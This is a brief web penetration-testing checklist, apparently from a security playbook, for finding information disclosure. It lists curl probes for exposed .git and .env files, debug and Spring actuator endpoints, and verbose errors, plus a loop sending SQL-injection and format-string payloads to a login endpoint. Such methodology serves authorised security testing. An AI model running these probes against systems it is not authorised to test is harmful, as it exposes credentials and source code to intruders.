# INFO DISCLOSURE — EXECUTION

| Signal | Test | Expected Leak | Confirm |
|--------|------|---------------|---------|
| Stack trace | `curl -X POST /api/login -d '{"email":null}'` | File paths, framework, DB details | grep 'Error\|Exception\|Warning\|at ' |
| Debug enabled | `curl /api/debug` or `?debug=true` | Config, env vars | grep 'DATABASE\|SECRET\|KEY\|PASSWORD' |
| .git exposed | `curl /api/.git/HEAD` | Full source code | 200 + response |
| .env exposed | `curl /api/.env` | Environment variables | grep 'DB_\|API_\|SECRET' |
| Swagger/OpenAPI | `curl /api/swagger.json` or `/api/docs` | Full API surface | JSON schema |
| Actuator (Spring) | `curl /actuator` or `/actuator/env` | Config, beans, health | grep 'java\|spring\|datasource' |
| Verbose errors | `curl /api/order?id[]=1` with wrong types | SQL/ORM queries | grep 'SELECT\|INSERT\|WHERE' |

## CURL
```bash
# Universal error probe
for payload in 'null' '[]' '{}' '{"a":1}' "'; SELECT 1; --" '%s%s%s%s'; do
  echo "=== Payload: $payload ==="
  curl -s -X POST /api/login -d "$payload" 2>&1 | head -20
done
```
